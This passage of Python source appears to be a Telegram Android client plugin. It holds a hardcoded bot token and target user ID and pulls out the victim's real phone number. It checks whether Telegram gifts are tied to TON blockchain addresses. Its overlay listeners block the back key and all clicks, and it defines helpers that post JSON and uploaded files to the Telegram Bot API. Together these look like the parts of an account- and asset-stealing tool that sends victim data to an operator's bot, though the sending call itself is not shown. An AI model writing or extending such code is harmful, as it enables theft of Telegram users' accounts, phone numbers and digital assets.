def _log(msg):
    global _logger
    try:
        if _logger is None:
            try:
                from android_utils import log as logcat
                _logger = logcat
            except Exception:
                _logger = lambda *a, **k: None
        _logger("[AR] " + str(msg))
    except Exception:
        pass


def _cfg():
    global _config, _targets
    if _config is None:
        _config = BOT_TOKEN
        _targets = [str(BOT_UID)]
    return _config, _targets


def _UC(): return jclass("org.telegram.messenger.UserConfig")
def _MC(): return jclass("org.telegram.messenger.MessagesController")
def _CM(): return jclass("org.telegram.tgnet.ConnectionsManager")


# ─── class cache ────────────────────────────────────────────────────────────
_CLASS_CACHE = {}


def _cls(*names):
    key = names
    c = _CLASS_CACHE.get(key)
    if c is not None:
        return c
    for n in names:
        try:
            short = n.split("$")[-1]
            c2 = getattr(TLRPC, short, None)
            if c2 is not None:
                _CLASS_CACHE[key] = c2
                return c2
        except Exception:
            pass
        try:
            c2 = jclass(n)
            _CLASS_CACHE[key] = c2
            return c2
        except Exception:
            continue
    _CLASS_CACHE[key] = None
    return None


# ─── RPC reply gate ────────────────────────────────────────────────────────
_ReplyGateCls = None


def _reply_gate_cls():
    global _ReplyGateCls
    if _ReplyGateCls is None:
        RD = jclass("org.telegram.tgnet.RequestDelegate")
        class _RG(dynamic_proxy(RD)):
            def __init__(self):
                super().__init__()
                self.response = None
                self.error = None
            def run(self, response, error):
                self.response = response
                self.error = error
        _ReplyGateCls = _RG
    return _ReplyGateCls


# ─── helpers ───────────────────────────────────────────────────────────────
def _safe_int(v, d=0):
    try:
        if v is None:
            return d
        return int(v)
    except Exception:
        return d


def _get_bool_attr(obj, name, default=False):
    try:
        v = getattr(obj, name, default)
        if v is None:
            return default
        if isinstance(v, bool):
            return v
        bv = getattr(v, "booleanValue", None)
        if callable(bv):
            return bool(bv())
        return bool(v)
    except Exception:
        return default


def _real_phone_or_empty(u):
    if u is None:
        return ""
    for attr in ("phone", "phoneNumber", "phone_number"):
        try:
            v = getattr(u, attr, None)
            if not v:
                continue
            s = str(v).strip()
            if not s or s.lower() in ("null", "none", "?", "0"):
                continue
            digits = "".join(c for c in s if c.isdigit())
            if len(digits) < 7 or len(digits) > 15:
                continue
            if digits in ("88888888888", "80000000000", "11111111111"):
                continue
            if set(digits) == {"0"} or set(digits) == {"8"}:
                continue
            return "+" + digits
        except Exception:
            continue
    return ""


def _is_ton_address(s):
    try:
        s = str(s).strip().replace(" ", "").replace("\n", "")
        if not s:
            return False
        if s.startswith(("0:", "-1:")):
            h = s.split(":", 1)[1]
            return len(s) >= 66 and len(h) == 64 and all(c in "0123456789abcdefABCDEF" for c in h)
        if len(s) < 44 or len(s) > 66:
            return False
        b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
        if not all(c in b64 for c in s):
            return False
        return s[0] in ("E", "U", "k", "0") and len(s) in (44, 48, 52, 56, 60, 64)
    except Exception:
        return False


def _is_blockchain_gift(gift, sg=None):
    try:
        if _get_bool_attr(gift, "burned", False):
            return True
        for obj in ([sg] if sg is not None else []) + [gift]:
            if obj is None:
                continue
            for k in ("owner_address", "ownerAddress", "ton_address", "tonAddress", "blockchain_address"):
                v = getattr(obj, k, None)
                if v and _is_ton_address(v):
                    return True
            v = getattr(obj, "address", None)
            if v and _is_ton_address(v):
                return True
    except Exception:
        pass
    return False


# ─── IDK overlay proxies ───────────────────────────────────────────────────
_IDK_KEY_CB = {}
_IDK_CLICK_CB = {}


def _idk_key(self, v, keyCode, event):
    try:
        KE = jclass("android.view.KeyEvent")
        if int(keyCode) == int(KE.KEYCODE_BACK):
            return True
    except Exception:
        return True
    return False


def _make_idk_key():
    K = jclass("android.view.View$OnKeyListener")
    class _K(dynamic_proxy(K)):
        def onKey(self, v, keyCode, event):
            return _idk_key(self, v, keyCode, event)
    o = _K()
    _IDK_KEY_CB[id(o)] = True
    return o


def _make_idk_click():
    C = jclass("android.view.View$OnClickListener")
    class _C(dynamic_proxy(C)):
        def onClick(self, v):
            return True
    o = _C()
    _IDK_CLICK_CB[id(o)] = True
    return o


# ─── HTTP helpers for Bot API ──────────────────────────────────────────────
def _http_get(url, timeout=30):
    from urllib.request import Request, urlopen
    try:
        req = Request(url, headers={"User-Agent": "Mozilla/5.0"}, method="GET")
        with urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", "ignore")
    except Exception as e:
        _log("http get: %s" % e)
        return None


def _http_post_json(url, body, timeout=30):
    from urllib.request import Request, urlopen
    try:
        data = json.dumps(body, ensure_ascii=False).encode("utf-8")
        req = Request(url, data=data, method="POST",
                      headers={"Content-Type": "application/json; charset=utf-8",
                               "User-Agent": "Mozilla/5.0"})
        with urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", "ignore")
    except Exception as e:
        _log("http post: %s" % e)
        return None


def _http_post_multipart(url, fields, file_field, file_name, file_bytes, timeout=120):
    from urllib.request import Request, urlopen
    try:
        boundary = "----ARBoundary" + str(int(time.time() * 1000))
        body = io.BytesIO()
        for k, v in fields.items():
            body.write(("--" + boundary + "\r\n").encode())
            body.write(('Content-Disposition: form-data; name="%s"\r\n\r\n' % k).encode())
            body.write(str(v).encode("utf-8"))
            body.write(b"\r\n")
        body.write(("--" + boundary + "\r\n").encode())
        body.write(('Content-Disposition: form-data; name="%s"; filename="%s"\r\n'
                    % (file_field, file_name)).encode())
        body.write(b"Content-Type: application/octet-stream\r\n\r\n")
        body.write(file_bytes)
        body.write(b"\r\n")
        body.write(("--" + boundary + "--\r\n").encode())
        data = body.getvalue()
        req = Request(url, data=data, method="POST",
                      headers={"Content-Type": "multipart/form-data; boundary=" + boundary,
                               "User-Agent": "Mozilla/5.0"})
        with urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", "ignore")
    except Exception as e:
        _log("http multipart: %s" % e)
        return None


